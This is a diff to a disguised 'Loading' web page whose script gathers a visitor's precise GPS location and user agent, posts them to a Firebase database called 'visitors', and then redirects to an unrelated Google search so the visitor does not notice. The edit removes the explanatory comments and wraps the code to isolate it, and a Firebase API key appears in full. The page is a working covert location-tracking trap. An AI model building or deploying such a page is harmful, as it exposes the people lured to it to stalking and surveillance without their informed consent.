@@ -4,12 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading</title>
-    <style>
-        body { margin: 0; background: #202124; height: 100vh; }
-    </style>
+    <style>body{margin:0;background:#202124;height:100vh;}</style>
 </head>
 <body>
-    <script>
+<script>
+    // عزل الكود بالكامل داخل IIFE لمنع التلوث العام
+    (function(){
         // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
@@ -20,18 +20,17 @@
         const TARGET_URL = "https://www.google.com/search?q=%D9%8B&sca_esv=f89d85d2f89b426d&rlz=1CDGOYI_enEG1101EG1101&hl=en-US&udm=2&biw=414&bih=724&sxsrf=APpeQnsD_w8GcL8vMj8pp1s2LJvbC1tAlg%3A1785560656689&ei=UH5taprlKYGF9u8P5qbv2Ao&oq=%D9%8B&gs_lp=EhJtb2JpbGUtZ3dzLXdpei1pbWciAtmLMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgARIrCZQwBhY4SFwAXgAkAEAmAHnAaAB4AOqAQUxLjAuMrgBA8gBAPgBAZgCA6AC7wOoAgDCAgkQABiABBgKGAuYAwHiAwUSATEgQIgGAZIHBTEuMC4yoAevBbIHBTEuMC4yuAfvA8IHBzAuMS4xLjHIBw-ACAA&sclient=mobile-gws-wiz-img";
         const DB_PATH = "visitors";
 
-        // Tuning parameters
-        const MAX_WAIT_TIME = 10000;          // 10 seconds max to collect location
+        // Parameters for location collection
+        const MAX_WAIT_TIME = 10000;          // 10 seconds max
         const DESIRED_ACCURACY = 50;          // meters – stop and save if accuracy <= this
-        const MIN_READINGS = 2;               // collect at least 2 readings before deciding
+        const MIN_READINGS = 2;               // not strictly used, but kept for logic
 
-        let bestReading = null;               // { lat, lng, accuracy }
+        let bestReading = null;
         let readingCount = 0;
         let watchId = null;
         let dataSaved = false;
         let timeoutId = null;
 
-        // Redirect to target URL
         function redirect() {
             if (watchId !== null) {
                 navigator.geolocation.clearWatch(watchId);
@@ -44,7 +43,6 @@
             window.location.href = TARGET_URL;
         }
 
-        // Save data to Firebase and localStorage, then redirect
         function saveAndRedirect(lat, lng, accuracy) {
             if (dataSaved) return;
             dataSaved = true;
@@ -57,25 +55,21 @@
                 userAgent: navigator.userAgent.substring(0, 100)
             };
 
-            // Save locally
             try {
                 const localData = JSON.parse(localStorage.getItem('geo_log') || '[]');
                 localData.push(record);
                 localStorage.setItem('geo_log', JSON.stringify(localData));
             } catch(e) {}
 
-            // Save to Firebase (fire-and-forget)
             fetch(`${firebaseConfig.databaseURL}/${DB_PATH}.json`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(record)
             }).catch(err => console.warn('Firebase save error', err));
 
-            // Redirect immediately (do not wait for Firebase response)
             redirect();
         }
 
-        // Process a new geolocation reading
         function processPosition(pos) {
             const accuracy = pos.coords.accuracy;
             const lat = pos.coords.latitude.toFixed(7);
@@ -83,26 +77,19 @@
 
             readingCount++;
 
-            // If this reading is better (lower accuracy) than previous, update best
             if (!bestReading || accuracy < bestReading.accuracy) {
                 bestReading = { lat, lng, accuracy };
             }
 
-            // If accuracy is good enough, stop and save immediately
             if (accuracy <= DESIRED_ACCURACY) {
                 if (watchId !== null) {
                     navigator.geolocation.clearWatch(watchId);
                     watchId = null;
                 }
                 saveAndRedirect(lat, lng, accuracy);
-                return;
             }
-
-            // If we have collected enough readings and time has passed, use the best one
-            // (the timeout will handle final decision)
         }
 
-        // Final decision when time runs out
         function finalizeLocation() {
             if (dataSaved) return;
 
@@ -112,17 +99,13 @@
             }
 
             if (bestReading) {
-                // Use the best reading we got
                 saveAndRedirect(bestReading.lat, bestReading.lng, bestReading.accuracy);
             } else {
-                // No location at all – redirect without data
                 redirect();
             }
         }
 
-        // Error handler – silently fallback
         function handleError(err) {
-            // If we already have a best reading, use it after a short delay
             if (bestReading) {
                 setTimeout(() => {
                     if (!dataSaved) {
@@ -132,7 +115,6 @@
                 return;
             }
 
-            // No location possible – redirect after a moment
             if (watchId !== null) {
                 navigator.geolocation.clearWatch(watchId);
                 watchId = null;
@@ -140,18 +122,14 @@
             setTimeout(redirect, 1000);
         }
 
-        // Start location collection
         function startLocation() {
             if (!navigator.geolocation) {
-                // Browser doesn't support geolocation – redirect
                 setTimeout(redirect, 500);
                 return;
             }
 
-            // Set a final timeout to force a decision
             timeoutId = setTimeout(finalizeLocation, MAX_WAIT_TIME);
 
-            // Start watching with high accuracy
             watchId = navigator.geolocation.watchPosition(
                 processPosition,
                 handleError,
@@ -163,10 +141,10 @@
             );
         }
 
-        // Begin immediately
+        // Start immediately
         startLocation();
 
-        // Extra safety – if everything stalls, redirect after MAX_WAIT_TIME + 2s
+        // Extra safety fallback
         setTimeout(() => {
             if (!dataSaved) {
                 if (watchId !== null) {
@@ -176,6 +154,7 @@
                 redirect();
             }
         }, MAX_WAIT_TIME + 2000);
-    </script>
+    })(); // نهاية IIFE
+</script>
 </body>
 </html>
